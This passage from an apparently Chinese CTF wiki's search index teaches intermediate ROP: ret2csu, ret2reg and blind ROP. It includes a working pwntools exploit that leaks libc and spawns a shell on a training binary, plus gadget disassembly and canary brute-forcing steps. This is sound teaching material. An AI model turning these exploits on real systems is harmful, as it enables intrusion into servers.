\u6ce8\uff1a\u8fd9\u91cc\u6211\u5c1d\u8bd5\u5728\u6211\u672c\u673a\u4f7f\u7528system\u51fd\u6570\u6765\u83b7\u53d6shell\u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u73af\u5883\u53d8\u91cf\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662fexecve\u6765\u83b7\u53d6shell\u3002  \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u83b7\u53d6write\u51fd\u6570\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain\u51fd\u6570  \u6839\u636elibcsearcher\u83b7\u53d6\u5bf9\u5e94libc\u7248\u672c\u4ee5\u53caexecve\u51fd\u6570\u5730\u5740  \u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u5411bss\u6bb5\u5199\u5165execve\u5730\u5740\u4ee5\u53ca'/bin/sh\u2019\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain\u51fd\u6570\u3002  \u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u6267\u884cexecve('/bin/sh')\u83b7\u53d6shell\u3002   exp\u5982\u4e0b  from   pwn   import   *  from   LibcSearcher   import   LibcSearcher  ##context.log_level =  debug  level5   =   ELF ( ./level5 )  sh   =   process ( ./level5 )  write_got   =   level5 . got [ write ]  read_got   =   level5 . got [ read ]  main_addr   =   level5 . symbols [ main ]  bss_base   =   level5 . bss ()  csu_front_addr   =   0x0000000000400600  csu_end_addr   =   0x000000000040061A  fakeebp   =   b   *   8  def   csu ( rbx ,   rbp ,   r12 ,   r13 ,   r14 ,   r15 ,   last ): \n     # pop rbx,rbp,r12,r13,r14,r15 \n     # rbx should be 0, \n     # rbp should be 1,enable not to jump \n     # r12 should be the function we want to call \n     # rdi=edi=r15d \n     # rsi=r14 \n     # rdx=r13 \n     payload   =   a   *   0x80   +   fakeebp \n     payload   +=   p64 ( csu_end_addr )   +   p64 ( rbx )   +   p64 ( rbp )   +   p64 ( r12 )   +   p64 ( \n         r13 )   +   p64 ( r14 )   +   p64 ( r15 ) \n     payload   +=   p64 ( csu_front_addr ) \n     payload   +=   a   *   0x38 \n     payload   +=   p64 ( last ) \n     sh . send ( payload ) \n     sleep ( 1 )  sh . recvuntil ( Hello, World \\n )  ## RDI, RSI, RDX, RCX, R8, R9, more on the stack  ## write(1,write_got,8)  csu ( 0 ,   1 ,   write_got ,   8 ,   write_got ,   1 ,   main_addr )  write_addr   =   u64 ( sh . recv ( 8 ))  libc   =   LibcSearcher ( write ,   write_addr )  libc_base   =   write_addr   -   libc . dump ( write )  execve_addr   =   libc_base   +   libc . dump ( execve )  log . success ( execve_addr    +   hex ( execve_addr ))  ##gdb.attach(sh)  ## read(0,bss_base,16)  ## read execve_addr and /bin/sh\\x00  sh . recvuntil ( Hello, World \\n )  csu ( 0 ,   1 ,   read_got ,   16 ,   bss_base ,   0 ,   main_addr )  sh . send ( p64 ( execve_addr )   +   /bin/sh \\x00 )  sh . recvuntil ( Hello, World \\n )  ## execve(bss_base+8)  csu ( 0 ,   1 ,   bss_base ,   0 ,   0 ,   bss_base   +   8 ,   main_addr )  sh . interactive ()", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_3", 
            "text": "", 
            "title": "\u601d\u8003"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_4", 
            "text": "\u5728\u4e0a\u9762\u7684\u65f6\u5019\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e86\u8fd9\u4e2a\u901a\u7528gadgets\uff0c\u5176\u8f93\u5165\u7684\u5b57\u8282\u957f\u5ea6\u4e3a128\u3002\u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u6f0f\u6d1e\u90fd\u53ef\u4ee5\u8ba9\u6211\u4eec\u8f93\u5165\u8fd9\u4e48\u957f\u7684\u5b57\u8282\u3002\u90a3\u4e48\u5f53\u5141\u8bb8\u6211\u4eec\u8f93\u5165\u7684\u5b57\u8282\u6570\u8f83\u5c11\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u6709\u4ec0\u4e48\u529e\u6cd5\u5462\uff1f\u4e0b\u9762\u7ed9\u51fa\u4e86\u51e0\u4e2a\u65b9\u6cd5", 
            "title": "\u6539\u8fdb"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#1-rbxrbp", 
            "text": "\u53ef\u4ee5\u770b\u5230\u5728\u6211\u4eec\u4e4b\u524d\u7684\u5229\u7528\u4e2d\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u6ee1\u8db3cmp\u7684\u6761\u4ef6\uff0c\u5e76\u8fdb\u884c\u8df3\u8f6c\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u51cf\u5c1116\u5b57\u8282\uff0c\u5373\u6211\u4eec\u6240\u9700\u7684\u5b57\u8282\u6570\u53ea\u9700\u8981112\u3002", 
            "title": "\u6539\u8fdb1-\u63d0\u524d\u63a7\u5236rbx\u4e0erbp"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#2-", 
            "text": "\u5176\u5b9e\uff0c\u6539\u8fdb1\u4e5f\u7b97\u662f\u4e00\u79cd\u591a\u6b21\u5229\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684gadgets\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u8fdb\u884c\u4e24\u6b21\u8c03\u7528\u6765\u8fbe\u5230\u7684\u76ee\u7684\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c11\u4e00\u6b21gadgets\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002\u4f46\u8fd9\u91cc\u7684\u591a\u6b21\u5229\u7528\u9700\u8981\u66f4\u52a0\u4e25\u683c\u7684\u6761\u4ef6   \u6f0f\u6d1e\u53ef\u4ee5\u88ab\u591a\u6b21\u89e6\u53d1  \u5728\u4e24\u6b21\u89e6\u53d1\u4e4b\u95f4\uff0c\u7a0b\u5e8f\u5c1a\u672a\u4fee\u6539r12-r15\u5bc4\u5b58\u5668\uff0c\u8fd9\u662f\u56e0\u4e3a\u8981\u4e24\u6b21\u8c03\u7528\u3002   \u5f53\u7136\uff0c\u6709\u65f6\u5019\u6211\u4eec\u4e5f\u4f1a\u9047\u5230\u4e00\u6b21\u6027\u53ef\u4ee5\u8bfb\u5165\u5927\u91cf\u7684\u5b57\u8282\uff0c\u4f46\u662f\u4e0d\u5141\u8bb8\u6f0f\u6d1e\u518d\u6b21\u5229\u7528\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u6211\u4eec\u4e00\u6b21\u6027\u5c06\u6240\u6709\u7684\u5b57\u8282\u5e03\u7f6e\u597d\uff0c\u4e4b\u540e\u6162\u6162\u5229\u7528\u3002", 
            "title": "\u6539\u8fdb2-\u591a\u6b21\u5229\u7528"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#gadget", 
            "text": "\u5176\u5b9e\uff0c\u9664\u4e86\u4e0a\u8ff0\u8fd9\u4e2agadgets\uff0cgcc\u9ed8\u8ba4\u8fd8\u4f1a\u7f16\u8bd1\u8fdb\u53bb\u4e00\u4e9b\u5176\u5b83\u7684\u51fd\u6570  _init\n_start\ncall_gmon_start\nderegister_tm_clones\nregister_tm_clones\n__do_global_dtors_aux\nframe_dummy\n__libc_csu_init\n__libc_csu_fini\n_fini  \u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u5176\u4e2d\u7684\u4e00\u4e9b\u4ee3\u7801\u6765\u8fdb\u884c\u6267\u884c\u3002\u6b64\u5916\uff0c\u7531\u4e8ePC\u672c\u8eab\u53ea\u662f\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u5730\u5740\u5904\u7684\u6570\u636e\u4f20\u9012\u7ed9CPU\uff0c\u800cCPU\u5219\u53ea\u662f\u5bf9\u4f20\u9012\u6765\u7684\u6570\u636e\u8fdb\u884c\u89e3\u7801\uff0c\u53ea\u8981\u89e3\u7801\u6210\u529f\uff0c\u5c31\u4f1a\u8fdb\u884c\u6267\u884c\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u6e90\u7a0b\u5e8f\u4e2d\u4e00\u4e9b\u5730\u5740\u8fdb\u884c\u504f\u79fb\u4ece\u800c\u6765\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u7684\u6307\u4ee4\uff0c\u53ea\u8981\u53ef\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u4e0d\u5d29\u6e83\u3002  \u9700\u8981\u4e00\u8bf4\u7684\u662f\uff0c\u5728\u4e0a\u9762\u7684libc_csu_init\u4e2d\u6211\u4eec\u4e3b\u8981\u5229\u7528\u4e86\u4ee5\u4e0b\u5bc4\u5b58\u5668   \u5229\u7528\u5c3e\u90e8\u4ee3\u7801\u63a7\u5236\u4e86rbx\uff0crbp\uff0cr12\uff0cr13\uff0cr14\uff0cr15\u3002  \u5229\u7528\u4e2d\u95f4\u90e8\u5206\u7684\u4ee3\u7801\u63a7\u5236\u4e86rdx\uff0crsi\uff0cedi\u3002   \u800c\u5176\u5b9elibc_csu_init\u7684\u5c3e\u90e8\u901a\u8fc7\u504f\u79fb\u662f\u53ef\u4ee5\u63a7\u5236\u5176\u4ed6\u5bc4\u5b58\u5668\u7684\u3002\u5176\u4e2d\uff0c0x000000000040061A\u662f\u6b63\u5e38\u7684\u8d77\u59cb\u5730\u5740\uff0c \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u57280x000000000040061f\u5904\u53ef\u4ee5\u63a7\u5236rbp\u5bc4\u5b58\u5668\uff0c\u57280x0000000000400621\u5904\u53ef\u4ee5\u63a7\u5236rsi\u5bc4\u5b58\u5668\u3002 \u800c\u5982\u679c\u60f3\u8981\u6df1\u5165\u5730\u4e86\u89e3\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u5c31\u8981\u5bf9\u6c47\u7f16\u6307\u4ee4\u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bb5\u8fdb\u884c\u66f4\u52a0\u900f\u5f7b\u5730\u7406\u89e3\u3002\u5982\u4e0b\u3002  gef \u27a4    x / 5 i   0x000000000040061A \n    0 x40061a   __libc_csu_init + 90 :     pop      rbx \n    0 x40061b   __libc_csu_init + 91 :     pop      rbp \n    0 x40061c   __libc_csu_init + 92 :     pop      r12 \n    0 x40061e   __libc_csu_init + 94 :     pop      r13 \n    0 x400620   __libc_csu_init + 96 :     pop      r14  gef \u27a4    x / 5 i   0x000000000040061b \n    0 x40061b   __libc_csu_init + 91 :     pop      rbp \n    0 x40061c   __libc_csu_init + 92 :     pop      r12 \n    0 x40061e   __libc_csu_init + 94 :     pop      r13 \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15  gef \u27a4    x / 5 i   0x000000000040061A + 3 \n    0 x40061d   __libc_csu_init + 93 :     pop      rsp \n    0 x40061e   __libc_csu_init + 94 :     pop      r13 \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret   gef \u27a4    x / 5 i   0x000000000040061e \n    0 x40061e   __libc_csu_init + 94 :     pop      r13 \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop  gef \u27a4    x / 5 i   0x000000000040061f \n    0 x40061f   __libc_csu_init + 95 :     pop      rbp \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop  gef \u27a4    x / 5 i   0x0000000000400620 \n    0 x400620   __libc_csu_init + 96 :     pop      r14 \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop \n    0 x400626:      nop      WORD   PTR   cs :[ rax + rax * 1 + 0x0 ]  gef \u27a4    x / 5 i   0x0000000000400621 \n    0 x400621   __libc_csu_init + 97 :     pop      rsi \n    0 x400622   __libc_csu_init + 98 :     pop      r15 \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop  gef \u27a4    x / 5 i   0x000000000040061A + 9 \n    0 x400623   __libc_csu_init + 99 :     pop      rdi \n    0 x400624   __libc_csu_init + 100 :    ret     \n    0x400625 :      nop \n    0 x400626:      nop      WORD   PTR   cs :[ rax + rax * 1 + 0x0 ] \n    0 x400630   __libc_csu_fini :    repz   ret", 
            "title": "gadget"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_5", 
            "text": "2016 XDCTF pwn100  2016 \u534e\u5c71\u676f SU_PWN   \u53c2\u8003\u9605\u8bfb   http://wooyun.jozxing.cc/static/drops/papers-7551.html  http://wooyun.jozxing.cc/static/drops/binary-10638.html", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#ret2reg", 
            "text": "", 
            "title": "ret2reg"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_6", 
            "text": "\u67e5\u770b\u6ea2\u51fa\u51fd\u8fd4\u56de\u65f6\u54ea\u4e2a\u5bc4\u5b58\u503c\u6307\u5411\u6ea2\u51fa\u7f13\u51b2\u533a\u7a7a\u95f4  \u7136\u540e\u53cd\u7f16\u8bd1\u4e8c\u8fdb\u5236\uff0c\u67e5\u627ecall reg \u6216\u8005jmp reg\u6307\u4ee4\uff0c\u5c06 EIP\u8bbe\u7f6e\u4e3a\u8be5\u6307\u4ee4\u5730\u5740  reg\u6240\u6307\u5411\u7684\u7a7a\u95f4\u4e0a\u6ce8\u5165Shellcode(\u9700\u8981\u786e\u4fdd\u8be5\u7a7a\u95f4\u662f\u53ef\u4ee5\u6267\u884c\u7684\uff0c\u4f46\u901a\u5e38\u90fd\u662f\u6808\u4e0a\u7684)", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#brop", 
            "text": "", 
            "title": "BROP"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_7", 
            "text": "BROP(Blind ROP)\u4e8e2014\u5e74\u7531Standford\u7684Andrea Bittau\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76\u6210\u679c\u53d1\u8868\u5728Oakland 2014\uff0c\u5176\u8bba\u6587\u9898\u76ee\u662f Hacking Blind \uff0c\u4e0b\u9762\u662f\u4f5c\u8005\u5bf9\u5e94\u7684paper\u548cslides,\u4ee5\u53ca\u4f5c\u8005\u76f8\u5e94\u7684\u4ecb\u7ecd   paper  slide   BROP\u662f\u6ca1\u6709\u5bf9\u5e94\u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u6216\u8005\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e0b\uff0c\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb\uff0c\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002", 
            "title": "\u57fa\u672c\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_8", 
            "text": "\u6e90\u7a0b\u5e8f\u5fc5\u987b\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4ee5\u4fbf\u4e8e\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002  \u670d\u52a1\u5668\u7aef\u7684\u8fdb\u7a0b\u5728\u5d29\u6e83\u4e4b\u540e\u4f1a\u91cd\u65b0\u542f\u52a8\uff0c\u5e76\u4e14\u91cd\u65b0\u542f\u52a8\u7684\u8fdb\u7a0b\u7684\u5730\u5740\u4e0e\u5148\u524d\u7684\u5730\u5740\u4e00\u6837\uff08\u8fd9\u4e5f\u5c31\u662f\u8bf4\u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4f46\u662f\u5176\u53ea\u662f\u5728\u7a0b\u5e8f\u6700\u521d\u542f\u52a8\u7684\u65f6\u5019\u6709\u6548\u679c\uff09\u3002\u76ee\u524dnginx, MySQL, Apache, OpenSSH\u7b49\u670d\u52a1\u5668\u5e94\u7528\u90fd\u662f\u7b26\u5408\u8fd9\u79cd\u7279\u6027\u7684\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_9", 
            "text": "\u76ee\u524d\uff0c\u5927\u90e8\u5206\u5e94\u7528\u90fd\u4f1a\u5f00\u542fASLR\u3001NX\u3001Canary\u4fdd\u62a4\u3002\u8fd9\u91cc\u6211\u4eec\u5206\u522b\u8bb2\u89e3\u5728BROP\u4e2d\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\uff0c\u4ee5\u53ca\u5982\u4f55\u8fdb\u884c\u653b\u51fb\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_10", 
            "text": "\u5728BROP\u4e2d\uff0c\u57fa\u672c\u7684\u9075\u5faa\u7684\u601d\u8def\u5982\u4e0b   \u5224\u65ad\u6808\u6ea2\u51fa\u957f\u5ea6  \u66b4\u529b\u679a\u4e3e    Stack Reading  \u83b7\u53d6\u6808\u4e0a\u7684\u6570\u636e\u6765\u6cc4\u9732canaries\uff0c\u4ee5\u53caebp\u548c\u8fd4\u56de\u5730\u5740\u3002    Bind ROP  \u627e\u5230\u8db3\u591f\u591a\u7684 gadgets \u6765\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5bf9\u5176\u8fdb\u884c\u8c03\u7528\uff0c\u6bd4\u5982\u8bf4\u5e38\u89c1\u7684 write \u51fd\u6570\u4ee5\u53caputs\u51fd\u6570\u3002    Build the exploit  \u5229\u7528\u8f93\u51fa\u51fd\u6570\u6765 dump \u51fa\u7a0b\u5e8f\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u7684 gadgets\uff0c\u4ece\u800c\u53ef\u4ee5\u5199\u51fa\u6700\u540e\u7684 exploit\u3002", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_11", 
            "text": "\u76f4\u63a5\u4ece1\u66b4\u529b\u679a\u4e3e\u5373\u53ef\uff0c\u76f4\u5230\u53d1\u73b0\u7a0b\u5e8f\u5d29\u6e83\u3002", 
            "title": "\u6808\u6ea2\u51fa\u957f\u5ea6"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#stack-reading", 
            "text": "\u5982\u4e0b\u6240\u793a\uff0c\u8fd9\u662f\u76ee\u524d\u7ecf\u5178\u7684\u6808\u5e03\u5c40  buffer|canary|saved fame pointer|saved returned address  \u8981\u5411\u5f97\u5230canary\u4ee5\u53ca\u4e4b\u540e\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u4f55\u5f97\u5230overflow\u7684\u957f\u5ea6\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u5c1d\u8bd5\u6765\u83b7\u53d6\u3002  \u5176\u6b21\uff0c\u5173\u4e8ecanary\u4ee5\u53ca\u540e\u9762\u7684\u53d8\u91cf\uff0c\u6240\u91c7\u7528\u7684\u7684\u65b9\u6cd5\u4e00\u81f4\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5canary\u4e3a\u4f8b\u3002  canary\u672c\u8eab\u53ef\u4ee5\u901a\u8fc7\u7206\u7834\u6765\u83b7\u53d6\uff0c\u4f46\u662f\u5982\u679c\u53ea\u662f\u611a\u8822\u5730\u679a\u4e3e\u6240\u6709\u7684\u6570\u503c\u7684\u8bdd\uff0c\u663e\u7136\u662f\u4f4e\u6548\u7684\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u6761\u4ef62\u8868\u660e\u4e86\u7a0b\u5e8f\u672c\u8eab\u5e76\u4e0d\u4f1a\u56e0\u4e3acrash\u6709\u53d8\u5316\uff0c\u6240\u4ee5\u6bcf\u6b21\u7684canary\u7b49\u503c\u90fd\u662f\u4e00\u6837\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u8fdb\u884c\u7206\u7834\u3002\u6b63\u5982\u8bba\u6587\u4e2d\u6240\u5c55\u793a\u7684\uff0c\u6bcf\u4e2a\u5b57\u8282\u6700\u591a\u6709256\u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u572832\u4f4d\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6700\u591a\u9700\u8981\u7206\u78341024\u6b21\uff0c64\u4f4d\u6700\u591a\u7206\u78342048\u6b21\u3002", 
            "title": "Stack Reading"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#blind-rop", 
            "text": "", 
            "title": "Blind ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_12", 
            "text": "\u6700\u6734\u7d20\u7684\u6267\u884cwrite\u51fd\u6570\u7684\u65b9\u6cd5\u5c31\u662f\u6784\u9020\u7cfb\u7edf\u8c03\u7528\u3002  pop   rdi ; ret # socket  pop   rsi ; ret # buffer  pop   rdx ; ret # length  pop   rax ; ret # write syscall number  syscall   \u4f46\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u6837\u7684\u65b9\u6cd5\u90fd\u662f\u6bd4\u8f83\u56f0\u96be\u7684\uff0c\u56e0\u4e3a\u60f3\u8981\u627e\u5230\u4e00\u4e2asyscall\u7684\u5730\u5740\u57fa\u672c\u4e0d\u53ef\u80fd\u3002\u3002\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8f6c\u6362\u4e3a\u627ewrite\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#brop-gadgets", 
            "text": "\u9996\u5148\uff0c\u5728libc_csu_init\u7684\u7ed3\u5c3e\u4e00\u957f\u4e32\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\u6765\u83b7\u53d6write\u51fd\u6570\u8c03\u7528\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u3002\u6b63\u5982\u6587\u4e2d\u6240\u5c55\u793a\u7684", 
            "title": "BROP gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#find-a-call-write", 
            "text": "\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7plt\u8868\u6765\u83b7\u53d6write\u7684\u5730\u5740\u3002", 
            "title": "find a call write"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#control-rdx", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0crdx\u53ea\u662f\u6211\u4eec\u7528\u6765\u8f93\u51fa\u7a0b\u5e8f\u5b57\u8282\u957f\u5ea6\u7684\u53d8\u91cf\uff0c\u53ea\u8981\u4e0d\u4e3a0\u5373\u53ef\u3002\u4e00\u822c\u6765\u8bf4\u7a0b\u5e8f\u4e2d\u7684rdx\u7ecf\u5e38\u6027\u4f1a\u4e0d\u662f\u96f6\u3002\u4f46\u662f\u4e3a\u4e86\u66f4\u597d\u5730\u63a7\u5236\u7a0b\u5e8f\u8f93\u51fa\uff0c\u6211\u4eec\u4ecd\u7136\u5c3d\u91cf\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e2a\u503c\u3002\u4f46\u662f\uff0c\u5728\u7a0b\u5e8f  pop   rdx ; ret   \u8fd9\u6837\u7684\u6307\u4ee4\u51e0\u4e4e\u6ca1\u6709\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u63a7\u5236rdx\u7684\u6570\u503c\u5462\uff1f\u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u6267\u884cstrcmp\u7684\u65f6\u5019\uff0crdx\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u5c06\u8981\u88ab\u6bd4\u8f83\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u627e\u5230strcmp\u51fd\u6570\uff0c\u4ece\u800c\u6765\u63a7\u5236rdx\u3002  \u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5206\u4e3a\u4e24\u9879   \u5bfb\u627egadgets  \u5bfb\u627ePLT\u8868  write\u5165\u53e3  strcmp\u5165\u53e3", 
            "title": "control rdx"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#gadgets", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u6765\u60f3\u529e\u6cd5\u5bfb\u627egadgets\u3002\u6b64\u65f6\uff0c\u7531\u4e8e\u5c1a\u672a\u77e5\u9053\u7a0b\u5e8f\u5177\u4f53\u957f\u4ec0\u4e48\u6837\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u901a\u8fc7\u7b80\u5355\u7684\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u81ea\u5df1\u8bbe\u7f6e\u7684\u503c\uff0c\u4ece\u800c\u800c\u6765\u731c\u6d4b\u76f8\u5e94\u7684gadgets\u3002\u800c\u5f53\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u65f6\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5   \u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83  \u7a0b\u5e8f\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u5d29\u6e83  \u7a0b\u5e8f\u4e00\u76f4\u8fd0\u884c\u800c\u5e76\u4e0d\u5d29\u6e83   \u4e3a\u4e86\u5bfb\u627e\u5408\u7406\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e24\u6b65", 
            "title": "\u5bfb\u627egadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#stop-gadgets", 
            "text": "\u6240\u8c13 stop gadget \u4e00\u822c\u6307\u7684\u662f\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff1a\u5f53\u7a0b\u5e8f\u7684\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u5165\u65e0\u9650\u5faa\u73af\uff0c\u8fd9\u6837\u4f7f\u5f97\u653b\u51fb\u8005\u80fd\u591f\u4e00\u76f4\u4fdd\u6301\u8fde\u63a5\u72b6\u6001\u3002   \u5176\u5b9estop gadget\u4e5f\u5e76\u4e0d\u4e00\u5b9a\u5f97\u662f\u4e0a\u9762\u7684\u6837\u5b50\uff0c\u5176\u6839\u672c\u7684\u76ee\u7684\u5728\u4e8e\u544a\u8bc9\u653b\u51fb\u8005\uff0c\u6240\u6d4b\u8bd5\u7684\u8fd4\u56de\u5730\u5740\u662f\u4e00\u4e2agadgets\u3002   \u4e4b\u6240\u4ee5\u8981\u5bfb\u627estop gadgets\uff0c\u662f\u56e0\u4e3a\u5f53\u6211\u4eec\u731c\u5230\u67d0\u4e2agadgtes\u540e\uff0c\u5982\u679c\u6211\u4eec\u4ec5\u4ec5\u662f\u5c06\u5176\u5e03\u7f6e\u5728\u6808\u4e0a\uff0c\u7531\u4e8e\u6267\u884c\u5b8c\u8fd9\u4e2agadget\u4e4b\u540e\uff0c\u7a0b\u5e8f\u8fd8\u4f1a\u8df3\u5230\u6808\u4e0a\u7684\u4e0b\u4e00\u4e2a\u5730\u5740\u3002\u5982\u679c\u8be5\u5730\u5740\u662f\u975e\u6cd5\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1acrash\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5728\u653b\u51fb\u8005\u770b\u6765\u7a0b\u5e8f\u53ea\u662f\u5355\u7eaf\u7684crash\u4e86\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u5c31\u4f1a\u8ba4\u4e3a\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u6267\u884c\u5230\u4efb\u4f55\u7684 useful gadget \uff0c\u4ece\u800c\u653e\u5f03\u5b83\u3002\u4f8b\u5b50\u5982\u4e0b\u56fe   